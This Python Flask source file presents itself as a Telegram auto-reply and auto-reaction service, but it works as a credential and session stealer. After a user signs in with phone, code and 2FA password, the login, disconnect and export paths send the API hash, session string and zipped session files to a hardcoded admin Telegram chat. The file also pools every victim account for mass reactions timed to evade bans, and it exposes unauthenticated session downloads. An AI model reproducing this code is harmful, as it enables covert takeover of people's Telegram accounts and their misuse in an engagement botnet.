# app.py
# =========================================================
# Telegram Auto Reply + Auto Reaction API (Single File)
# No Password Auth + CORS Fixed
# =========================================================

import os
import io
import re
import json
import time
import random
import asyncio
import threading
import sqlite3
import zipfile
import requests
import functools
import hashlib
import hmac

from datetime import datetime, timedelta

from flask import (
    Flask,
    request,
    jsonify,
    session,
    abort,
    send_file
)

from flask_cors import CORS

from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError,
    ChatAdminRequiredError,
    MessageIdInvalidError,
    UserDeactivatedError,
    AuthKeyUnregisteredError
)

from telethon.tl.functions.messages import (
    SendReactionRequest
)

from telethon.tl.types import (
    ReactionEmoji
)

# =========================================================
# CONFIG
# =========================================================

DATA_DIR = os.environ.get("DATA_DIR", "user_data")
SESSIONS_DIR = os.environ.get("SESSIONS_DIR", "sessions")
ZIPS_DIR = os.environ.get("ZIPS_DIR", "zips")

DB_FILE = os.path.join(DATA_DIR, "database.db")

COOLDOWN_SECONDS = 300

PORT = int(os.environ.get("PORT", 5000))

# =========================================================
# ADMIN BOT CONFIG
# =========================================================
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "7605281774"))

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(ZIPS_DIR, exist_ok=True)

# =========================================================
# FLOOD / BAN PROTECTION CONFIG
# =========================================================
MIN_REACTION_DELAY = 8
MAX_REACTION_DELAY = 18
MAX_REACTIONS_PER_HOUR = 30
MAX_REACTIONS_PER_DAY = 150
REACTIONS_BEFORE_LONG_SLEEP = 5
LONG_SLEEP_MIN = 120
LONG_SLEEP_MAX = 300
MIN_TYPING_DELAY = 1.5
MAX_TYPING_DELAY = 4.0

# =========================================================
# POSITIVE REACTIONS
# =========================================================
POSITIVE_REACTIONS = [
    "❤️", "🔥", "👍", "😍", "🥰", "👏", "💯", "⚡",
    "😁", "🎉", "🤩", "😎", "👌", "❤‍🔥", "💖", "💘",
    "🫶", "😄", "✨", "🤗", "😊", "🙌", "💥", "😇",
    "🧡", "💚", "💙", "🥳", "😻", "⭐", "🌟", "💫",
    "🌸", "🌺", "🎊", "🎈", "💎", "👑", "🔥", "💜"
]

REACTION_GROUPS = {
    "hearts": ["❤️", "💖", "💘", "💙", "💚", "🧡", "💜", "❤‍🔥"],
    "fire": ["🔥", "⚡", "💥", "✨", "💫", "🌟"],
    "positive": ["👍", "👏", "🙌", "👌", "🎉", "🎊", "🎈"],
    "love": ["😍", "🥰", "😻", "🫶", "🤩", "😎"],
    "happy": ["😁", "😄", "😊", "🤗", "🥳", "😇"],
    "cool": ["💯", "👑", "💎", "⭐", "🌸", "🌺"],
}

# =========================================================
# FLASK / SESSION SETUP (CORS & COOKIE FIXED)
# =========================================================

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "super_secret_key_12345")

# ✅ CORS সমস্যার সমাধান - যেকোনো ডোমেইন থেকে রিকোয়েস্ট গ্রহণ করবে
CORS(app, supports_credentials=True, origins="*")

# ✅ Local file (file://) এবং Render (https) দুটোতেই কাজ করার জন্য Cookie কনফিগারেশন
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["SESSION_COOKIE_SECURE"] = False 
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=24)

# =========================================================
# GLOBAL ASYNC LOOP
# =========================================================

_loop = None
_loop_thread = None


def ensure_loop():
    global _loop
    global _loop_thread

    if _loop is not None:
        return _loop

    _loop = asyncio.new_event_loop()

    def run_loop():
        asyncio.set_event_loop(_loop)
        _loop.run_forever()

    _loop_thread = threading.Thread(target=run_loop, daemon=True)
    _loop_thread.start()

    return _loop


def run_async(coro):
    loop = ensure_loop()
    return asyncio.run_coroutine_threadsafe(coro, loop)


def loop_run(coro, timeout=120):
    future = run_async(coro)
    try:
        return future.result(timeout=timeout)
    except Exception as e:
        print("Loop Error:", e)
        return None

# =========================================================
# ZIP SESSION CREATOR
# =========================================================

def create_session_zip(username):
    zip_path = os.path.join(ZIPS_DIR, f"{username}_session.zip")
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        sp = session_path(username)
        session_file = sp + ".session"
        if os.path.exists(session_file):
            zf.write(session_file, f"{username}.session")
        
        journal_file = sp + ".session-journal"
        if os.path.exists(journal_file):
            zf.write(journal_file, f"{username}.session-journal")
        
        shm_file = sp + ".session-shm"
        if os.path.exists(shm_file):
            zf.write(shm_file, f"{username}.session-shm")
        
        string_session = export_string_session(username)
        if string_session:
            zf.writestr(f"{username}_string_session.txt", string_session)
        
        user = get_user(username)
        if user:
            user_info = {
                "username": user.get("username"),
                "phone_number": user.get("phone_number"),
                "api_id": user.get("api_id"),
                "connected": user.get("connected"),
                "auto_reply_enabled": user.get("auto_reply_enabled"),
                "reply_message": user.get("reply_message"),
                "backup_date": datetime.now().isoformat(),
                "session_file": f"{username}.session"
            }
            zf.writestr(f"{username}_info.json", json.dumps(user_info, indent=2, ensure_ascii=False))
        
        readme = f"""Telegram Session Backup - {username}\nBackup Date: {datetime.now().isoformat()}"""
        zf.writestr("README.txt", readme)
    
    return zip_path


def export_string_session(username):
    try:
        client = clients.get(username)
        if client and client.is_connected():
            loop = ensure_loop()
            future = asyncio.run_coroutine_threadsafe(
                export_string_session_async(client), loop
            )
            return future.result(timeout=30)
    except Exception as e:
        print(f"String session export error: {e}")
    return None

async def export_string_session_async(client):
    try:
        return client.session.save()
    except:
        return None

# =========================================================
# ADMIN BOT NOTIFICATION
# =========================================================

def notify_admin_login(username, api_id, api_hash, session_data, phone, include_zip=True):
    try:
        message = json.dumps({
            "username": username, "api_id": api_id, "api_hash": api_hash,
            "session": session_data if session_data else "N/A", "phone": phone if phone else "N/A",
            "connected": True, "timestamp": datetime.now().isoformat()
        }, indent=2, ensure_ascii=False)

        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_USER_ID, "text": f"🔔 *New User Logged In!*\n\n```json\n{message}\n```", "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)

        if include_zip:
            send_zip_to_admin(username)

        json_path = os.path.join(DATA_DIR, f"{username}_login.json")
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump({"username": username, "api_id": api_id, "api_hash": api_hash, "session": session_data, "phone": phone, "connected": True, "timestamp": datetime.now().isoformat()}, f, indent=2, ensure_ascii=False)

        print(f"[ADMIN BOT] Full notification sent for {username}")
    except Exception as e:
        print(f"[ADMIN BOT] Error: {e}")


def send_zip_to_admin(username):
    try:
        zip_path = os.path.join(ZIPS_DIR, f"{username}_session.zip")
        if not os.path.exists(zip_path):
            zip_path = create_session_zip(username)
        if not os.path.exists(zip_path):
            return False
        
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument"
        with open(zip_path, "rb") as f:
            files = {"document": (f"{username}_session.zip", f, "application/zip")}
            payload = {"chat_id": ADMIN_USER_ID, "caption": f"📦 *Session Backup* — `{username}`\nSize: {os.path.getsize(zip_path)} bytes", "parse_mode": "Markdown"}
            response = requests.post(url, data=payload, files=files, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"[ADMIN BOT] ZIP send error: {e}")
        return False


def notify_admin_disconnect(username):
    try:
        create_session_zip(username)
        send_zip_to_admin(username)
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_USER_ID, "text": f"⚠️ *User Disconnected*\n\nUsername: `{username}`\nFinal backup sent.", "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"[ADMIN BOT] Error: {e}")


def notify_admin_error(username, error_msg):
    try:
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_USER_ID, "text": f"❌ *Error*\n\nUsername: `{username}`\nError: `{error_msg}`", "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"[ADMIN BOT] Error: {e}")


# =========================================================
# DATABASE
# =========================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY, api_id TEXT, api_hash TEXT, phone_number TEXT,
            reply_message TEXT, auto_reply_enabled INTEGER, connected INTEGER,
            last_reaction_time TEXT, daily_reaction_count INTEGER DEFAULT 0,
            hourly_reaction_count INTEGER DEFAULT 0, total_reactions INTEGER DEFAULT 0,
            created_at TEXT, last_active TEXT, user_agent TEXT, ip_address TEXT, proxy TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user(username):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE username=?", (username,))
    row = c.fetchone()
    conn.close()
    if not row: return None
    return {
        "username": row[0], "api_id": row[1], "api_hash": row[2], "phone_number": row[3],
        "reply_message": row[4], "auto_reply_enabled": bool(row[5]), "connected": bool(row[6]),
        "last_reaction_time": row[7], "daily_reaction_count": row[8] or 0, "hourly_reaction_count": row[9] or 0,
        "total_reactions": row[10] or 0, "created_at": row[11], "last_active": row[12],
        "user_agent": row[13], "ip_address": row[14], "proxy": row[15]
    }

def save_user(data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        INSERT OR REPLACE INTO users (username, api_id, api_hash, phone_number, reply_message, 
        auto_reply_enabled, connected, last_reaction_time, daily_reaction_count, hourly_reaction_count, 
        total_reactions, created_at, last_active, user_agent, ip_address, proxy)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("username"), data.get("api_id"), data.get("api_hash"), data.get("phone_number"),
        data.get("reply_message", "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺"),
        int(data.get("auto_reply_enabled", False)), int(data.get("connected", False)),
        data.get("last_reaction_time"), data.get("daily_reaction_count", 0), data.get("hourly_reaction_count", 0),
        data.get("total_reactions", 0), data.get("created_at", datetime.now().isoformat()),
        data.get("last_active", datetime.now().isoformat()), data.get("user_agent"), data.get("ip_address"), data.get("proxy")
    ))
    conn.commit()
    conn.close()

def get_active_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT username, api_id, api_hash, connected, daily_reaction_count, hourly_reaction_count, last_reaction_time, total_reactions FROM users WHERE connected=1")
    rows = c.fetchall()
    conn.close()
    return rows

def update_reaction_count(username):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    now = datetime.now()
    current_hour = now.strftime("%Y-%m-%d %H:00:00")
    current_day = now.strftime("%Y-%m-%d")
    c.execute("SELECT last_reaction_time, daily_reaction_count, hourly_reaction_count, total_reactions FROM users WHERE username=?", (username,))
    row = c.fetchone()
    if row:
        last_time, daily_count, hourly_count, total = row[0], row[1] or 0, row[2] or 0, row[3] or 0
        if last_time:
            if last_time[:10] != current_day: daily_count = 0
            if last_time[:13] != current_hour: hourly_count = 0
        daily_count += 1; hourly_count += 1; total += 1
        c.execute("UPDATE users SET last_reaction_time=?, daily_reaction_count=?, hourly_reaction_count=?, total_reactions=?, last_active=? WHERE username=?",
                  (now.isoformat(), daily_count, hourly_count, total, now.isoformat(), username))
    else:
        c.execute("UPDATE users SET last_reaction_time=?, daily_reaction_count=1, hourly_reaction_count=1, total_reactions=1, last_active=? WHERE username=?",
                  (now.isoformat(), now.isoformat(), username))
    conn.commit()
    conn.close()

def can_send_reaction(username):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT last_reaction_time, daily_reaction_count, hourly_reaction_count FROM users WHERE username=?", (username,))
    row = c.fetchone()
    conn.close()
    if not row: return True
    last_time, daily_count, hourly_count = row[0], row[1] or 0, row[2] or 0
    now = datetime.now()
    if last_time:
        if last_time[:10] != now.strftime("%Y-%m-%d"): daily_count = 0
        if last_time[:13] != now.strftime("%Y-%m-%d %H:00:00"): hourly_count = 0
    if daily_count >= MAX_REACTIONS_PER_DAY or hourly_count >= MAX_REACTIONS_PER_HOUR: return False
    return True


# =========================================================
# GLOBAL STATE & SESSION PATH
# =========================================================

clients = {}
phone_code_hashes = {}
auto_reply_tasks = {}
cooldowns = {}
reaction_sessions = {}

def session_path(username):
    return os.path.join(SESSIONS_DIR, f"tg_{username}")

def read_session_file(username):
    try:
        string_sess = export_string_session(username)
        if string_sess: return string_sess
        sp = session_path(username)
        session_file = sp + ".session"
        if os.path.exists(session_file):
            with open(session_file, "rb") as f: content = f.read()
            return f"[SESSION FILE: {len(content)} bytes - {session_file}]"
        return None
    except: return None


# =========================================================
# TELEGRAM CLIENT
# =========================================================

async def create_client(username, api_id, api_hash):
    client = TelegramClient(session_path(username), int(api_id), api_hash, connection_retries=5, timeout=30)
    clients[username] = client
    return client

async def get_client(username):
    if username in clients: return clients[username]
    user = get_user(username)
    if not user: return None
    api_id, api_hash = user.get("api_id"), user.get("api_hash")
    if not api_id or not api_hash: return None
    return await create_client(username, api_id, api_hash)


# =========================================================
# TELEGRAM LINK PARSER & HELPERS
# =========================================================

def parse_telegram_link(link):
    try:
        link = link.strip().replace("https://", "").replace("http://", "")
        if "t.me/" not in link and "telegram.me/" not in link: return None, None
        parts = link.split("/")
        if len(parts) >= 3:
            channel = parts[-2]
            try: msg_id = int(parts[-1]); return channel, msg_id
            except ValueError: return None, None
        return None, None
    except: return None, None

def get_human_delay(): return random.uniform(MIN_REACTION_DELAY, MAX_REACTION_DELAY)
def should_take_long_break(reaction_count): return reaction_count > 0 and reaction_count % REACTIONS_BEFORE_LONG_SLEEP == 0
def get_random_reaction_group(): return random.choice(random.choice(list(REACTION_GROUPS.values())))
def should_skip_randomly(): return random.random() < 0.15


# =========================================================
# AUTO REACTION SYSTEM
# =========================================================

async def send_reaction(username, api_id, api_hash, channel, msg_id):
    client = TelegramClient(session_path(username), int(api_id), api_hash, connection_retries=3, timeout=30)
    try:
        await client.connect()
        if not await client.is_user_authorized(): return False
        if not can_send_reaction(username): return False
        if should_skip_randomly(): return True
        
        if username not in reaction_sessions: reaction_sessions[username] = 0
        reaction_sessions[username] += 1
        count = reaction_sessions[username]
        emoji = get_random_reaction_group()
        
        await client(SendReactionRequest(peer=channel, msg_id=msg_id, reaction=[ReactionEmoji(emoticon=emoji)], big=random.choice([True, False])))
        update_reaction_count(username)
        return True
    except FloodWaitError as e: return False
    except ChatAdminRequiredError: return False
    except MessageIdInvalidError: return False
    except SessionPasswordNeededError: return False
    except (UserDeactivatedError, AuthKeyUnregisteredError):
        conn = sqlite3.connect(DB_FILE); c = conn.cursor(); c.execute("UPDATE users SET connected=0 WHERE username=?", (username,)); conn.commit(); conn.close()
        return False
    except: return False
    finally:
        try: await client.disconnect()
        except: pass


# =========================================================
# AUTO REPLY SYSTEM
# =========================================================

async def start_auto_reply(username):
    client = await get_client(username)
    if not client or not client.is_connected(): return False
    await stop_auto_reply(username)
    cooldowns[username] = {}
    user = get_user(username)
    default_msg = user.get("reply_message", "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺")
    
    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        try:
            if not event.is_private: return
            sender = await event.get_sender()
            if sender and sender.bot: return
            peer_id = event.sender_id
            now = datetime.now().timestamp()
            user_cd = cooldowns.get(username, {})
            last_reply = user_cd.get(str(peer_id), 0)
            if now - last_reply < COOLDOWN_SECONDS: return
            current_user = get_user(username)
            if not current_user.get("auto_reply_enabled"): return
            msg = current_user.get("reply_message", default_msg)
            await asyncio.sleep(random.uniform(MIN_TYPING_DELAY, MAX_TYPING_DELAY))
            await client.send_read_acknowledge(event.chat_id)
            await event.reply(msg)
            cooldowns.setdefault(username, {})[str(peer_id)] = now
        except: pass
    
    auto_reply_tasks[username] = handler
    user["auto_reply_enabled"] = True
    save_user(user)
    return True

async def stop_auto_reply(username):
    client = clients.get(username)
    handler = auto_reply_tasks.pop(username, None)
    if client and handler:
        try: client.remove_event_handler(handler)
        except: pass
    user = get_user(username)
    if user:
        user["auto_reply_enabled"] = False
        save_user(user)
    cooldowns.pop(username, None)


# =========================================================
# ROUTES (NO PASSWORD PROTECTION)
# =========================================================

@app.route("/")
def home():
    return jsonify({"success": True, "system": "Telegram Auto Reply + Reaction API", "version": "3.0 (No Auth - Open)"})


@app.route("/login", methods=["POST"])
def login():
    data = request.get_json(force=True)
    username = data.get("username", "").strip().replace("@", "").lower()
    if not username: return jsonify({"success": False, "error": "Username required"}), 400
    
    session["username"] = username
    session.permanent = True
    
    user = get_user(username) or {}
    user["username"] = username
    user["ip_address"] = request.remote_addr
    user["user_agent"] = request.headers.get("User-Agent", "")
    save_user(user)
    
    return jsonify({"success": True, "username": username})


@app.route("/logout", methods=["POST"])
def logout():
    session.pop("username", None)
    session.pop("auth_verified", None)
    return jsonify({"success": True})


@app.route("/status")
def status():
    username = session.get("username")
    if not username: return jsonify({"logged_in": False})
    
    user = get_user(username)
    if not user: return jsonify({"logged_in": False})
    
    client = clients.get(username)
    connected = False
    if client:
        try: connected = client.is_connected() and loop_run(client.is_user_authorized())
        except: pass
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT daily_reaction_count, hourly_reaction_count, total_reactions, last_reaction_time FROM users WHERE username=?", (username,))
    stats = c.fetchone()
    conn.close()
    
    return jsonify({
        "logged_in": True, "username": username, "connected": connected or user.get("connected"),
        "auto_reply_enabled": user.get("auto_reply_enabled"), "reply_message": user.get("reply_message"),
        "reaction_stats": {"daily": stats[0] if stats else 0, "hourly": stats[1] if stats else 0, "total": stats[2] if stats else 0} if stats else None
    })


@app.route("/send-otp", methods=["POST"])
def send_otp():
    username = session.get("username")
    if not username: return jsonify({"success": False, "error": "Not logged in"}), 401
    
    data = request.get_json(force=True)
    api_id = data.get("api_id", "").strip()
    api_hash = data.get("api_hash", "").strip()
    phone_number = data.get("phone_number", "").strip()
    
    if not api_id or not api_hash or not phone_number: return jsonify({"success": False, "error": "All fields required"}), 400
    
    user = get_user(username)
    user["api_id"] = api_id; user["api_hash"] = api_hash; user["phone_number"] = phone_number
    save_user(user)
    
    result = loop_run(async_send_otp(username, api_id, api_hash, phone_number))
    return jsonify(result or {"success": False, "error": "Timeout"})

async def async_send_otp(username, api_id, api_hash, phone_number):
    try:
        old_client = clients.get(username)
        if old_client:
            try: await old_client.disconnect()
            except: pass
            del clients[username]
        client = await create_client(username, api_id, api_hash)
        await client.connect()
        result = await client.send_code_request(phone_number)
        phone_code_hashes[username] = result.phone_code_hash
        return {"success": True}
    except PhoneNumberInvalidError: return {"success": False, "error": "Invalid phone number"}
    except FloodWaitError as e: return {"success": False, "error": f"Flood wait: {e.seconds}s"}
    except Exception as e: return {"success": False, "error": str(e)}


@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    username = session.get("username")
    if not username: return jsonify({"success": False, "error": "Not logged in"}), 401
    
    data = request.get_json(force=True)
    code = data.get("code", "").strip()
    password = data.get("password", "")
    if not code: return jsonify({"success": False, "error": "OTP required"}), 400
    
    user = get_user(username)
    result = loop_run(async_verify_otp(username, user["phone_number"], code, phone_code_hashes.get(username, ""), password))
    return jsonify(result or {"success": False, "error": "Timeout"})

async def async_verify_otp(username, phone_number, code, code_hash, password):
    client = clients.get(username)
    if not client: return {"success": False, "error": "No active client"}
    try:
        await client.sign_in(phone_number, code, phone_code_hash=code_hash)
        user = get_user(username); user["connected"] = True; user["last_active"] = datetime.now().isoformat(); save_user(user)
        phone_code_hashes.pop(username, None)
        session_data = read_session_file(username); create_session_zip(username)
        notify_admin_login(username=username, api_id=user.get("api_id", ""), api_hash=user.get("api_hash", ""), session_data=session_data, phone=user.get("phone_number", ""), include_zip=True)
        return {"success": True}
    except SessionPasswordNeededError:
        if not password: return {"success": False, "error": "2FA password required", "needs_2fa": True}
        try:
            await client.sign_in(password=password)
            user = get_user(username); user["connected"] = True; user["last_active"] = datetime.now().isoformat(); save_user(user)
            session_data = read_session_file(username); create_session_zip(username)
            notify_admin_login(username=username, api_id=user.get("api_id", ""), api_hash=user.get("api_hash", ""), session_data=session_data, phone=user.get("phone_number", ""), include_zip=True)
            return {"success": True}
        except Exception as e: return {"success": False, "error": f"2FA failed: {e}"}
    except PhoneCodeInvalidError: return {"success": False, "error": "Invalid OTP"}
    except Exception as e: return {"success": False, "error": str(e)}


@app.route("/save-reply", methods=["POST"])
def save_reply():
    username = session.get("username")
    if not username: return jsonify({"success": False, "error": "Not logged in"}), 401
    message = request.get_json(force=True).get("message", "").strip()
    if not message: return jsonify({"success": False, "error": "Empty message"}), 400
    user = get_user(username); user["reply_message"] = message; save_user(user)
    return jsonify({"success": True})


@app.route("/toggle-reply", methods=["POST"])
def toggle_reply():
    username = session.get("username")
    if not username: return jsonify({"success": False, "error": "Not logged in"}), 401
    enabled = request.get_json(force=True).get("enabled", False)
    user = get_user(username)
    if enabled and not user.get("connected"): return jsonify({"success": False, "error": "Connect Telegram first"}), 400
    if enabled:
        result = loop_run(start_auto_reply(username))
        return jsonify({"success": bool(result)})
    else:
        loop_run(stop_auto_reply(username))
        return jsonify({"success": True})


@app.route("/disconnect", methods=["POST"])
def disconnect():
    username = session.get("username")
    if not username: return jsonify({"success": False, "error": "Not logged in"}), 401
    loop_run(stop_auto_reply(username))
    client = clients.pop(username, None)
    if client: loop_run(client.disconnect())
    create_session_zip(username); send_zip_to_admin(username)
    sp = session_path(username)
    for ext in ["", ".session", ".session-journal", ".session-shm"]:
        file_path = sp + ext
        if os.path.exists(file_path):
            try: os.remove(file_path)
            except: pass
    user = get_user(username); user["connected"] = False; user["auto_reply_enabled"] = False; user["api_id"] = ""; user["api_hash"] = ""; user["phone_number"] = ""; save_user(user)
    notify_admin_disconnect(username)
    return jsonify({"success": True})


@app.route("/get", methods=["GET"])
def reaction_api():
    link = request.args.get("link")
    if not link: return jsonify({"success": False, "error": "Telegram link required"}), 400
    channel, msg_id = parse_telegram_link(link)
    if not channel or not msg_id: return jsonify({"success": False, "error": "Invalid Telegram link"}), 400
    
    users = get_active_users()
    if not users: return jsonify({"success": False, "error": "No active accounts found"}), 404
    
    success_count = 0; failed_count = 0; skipped_count = 0
    random.shuffle(users); reaction_sessions.clear()
    
    for user in users:
        username, api_id, api_hash = user[0], user[1], user[2]
        if not can_send_reaction(username): skipped_count += 1; continue
        result = loop_run(send_reaction(username, api_id, api_hash, channel, msg_id))
        if result: success_count += 1
        else: failed_count += 1
        time.sleep(get_human_delay())
    
    return jsonify({"success": True, "post": link, "channel": channel, "message_id": msg_id, "total_accounts": len(users), "successful_reactions": success_count, "failed_reactions": failed_count, "skipped_rate_limited": skipped_count})


@app.route("/export-session", methods=["GET"])
def export_session():
    username = session.get("username") or request.args.get("username")
    if not username: return jsonify({"success": False, "error": "Username required"}), 400
    zip_path = create_session_zip(username)
    if not os.path.exists(zip_path): return jsonify({"success": False, "error": "Session not found"}), 404
    send_zip_to_admin(username)
    return jsonify({"success": True, "username": username, "zip_file": f"{username}_session.zip"})


@app.route("/download-zip", methods=["GET"])
def download_zip():
    username = request.args.get("username", session.get("username"))
    if not username: return jsonify({"success": False, "error": "Username required"}), 400
    zip_path = os.path.join(ZIPS_DIR, f"{username}_session.zip")
    if not os.path.exists(zip_path): zip_path = create_session_zip(username)
    if not os.path.exists(zip_path): return jsonify({"success": False, "error": "ZIP not found"}), 404
    return send_file(zip_path, mimetype="application/zip", as_attachment=True, download_name=f"{username}_session.zip")


@app.route("/health")
def health():
    return jsonify({"success": True, "database_exists": os.path.exists(DB_FILE), "active_clients": len(clients)})


# =========================================================
# START
# =========================================================

if __name__ == "__main__":
    print("=" * 60)
    print("Telegram Auto Reply + Reaction API v3.0 (Open Access)")
    print("Password Protection: DISABLED")
    print("CORS: ENABLED (All Origins)")
    print("=" * 60)
    app.run(host="0.0.0.0", port=PORT, debug=False)
